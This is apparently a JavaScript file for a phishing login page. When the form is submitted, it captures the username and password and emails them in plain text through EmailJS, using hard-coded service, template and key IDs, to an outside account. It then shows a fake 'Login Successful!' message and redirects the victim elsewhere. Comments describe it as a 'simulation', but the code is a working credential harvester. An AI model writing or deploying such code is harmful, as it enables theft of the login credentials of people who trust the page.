document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    
    console.log("Username or email or phone:", username);
    console.log("Password:", password);
    
    // Simulate successful login (you can replace this with your own logic)
    simulateLogin(username, password);
});

function simulateLogin(username, password) {
    // Simulate sending email or any other action
    console.log("Simulating login for:", username);
    
    // Example: Send email using EmailJS
    sendEmail(username, password);
    
    // For demo, show a success message
    showSuccessMessage();
}

function showSuccessMessage() {
    var loginContainer = document.getElementById('login-container');
    loginContainer.innerHTML = '<h2>Login Successful!</h2><p>Redirecting...</p>';
    setTimeout(function() {
        // Replace with your actual redirection logic
        window.location.href = "https://example.com"; // Redirect to desired page
    }, 2000); // Delay for 2 seconds before redirection
}

function forgotPassword() {
    alert("Functionality to reset password should be implemented here.");
}

// EmailJS Initialization
(function() {
    emailjs.init('eqSjEnpKwVVzJonbI');
})();

function sendEmail(username, password) {
    var templateParams = {
        username: username,
        password: password
    };
    
    emailjs.send('service_xdsujrgi', 'template_26xeim7', templateParams)
        .then(function(response) {
            console.log('Email sent:', response);
        }, function(error) {
            console.error('Email error:', error);
        });
}